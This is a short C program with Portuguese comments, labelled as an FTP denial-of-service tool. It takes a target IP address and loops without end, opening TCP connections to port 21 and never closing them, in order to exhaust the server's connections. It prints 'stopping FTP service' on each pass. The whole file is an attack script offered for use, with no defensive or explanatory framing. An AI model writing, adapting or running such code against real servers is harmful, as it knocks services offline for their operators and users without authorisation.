//DoS FTP em C

#include <stdio.h>
#include <netdb.h>

main (int argc, char * argv[])
{


	int meusocket;
	int conecta;
	
	int port = 21;
	
	char * destino;
	
	destino = argv[1];

	struct sockaddr_in alvo;

	
	if(argc < 2)
	{
	printf("Exemplo de uso: %s 192.168.0.1\n",argv[0]);
	}
	else{


		while(1)
		{
			meusocket = socket(AF_INET, SOCK_STREAM, 0);
			alvo.sin_family = AF_INET;
			alvo.sin_port = htons(port);
			alvo.sin_addr.s_addr = inet_addr(destino);

			conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

			printf("Parando serviço FTP...\n");

		}
	}

}
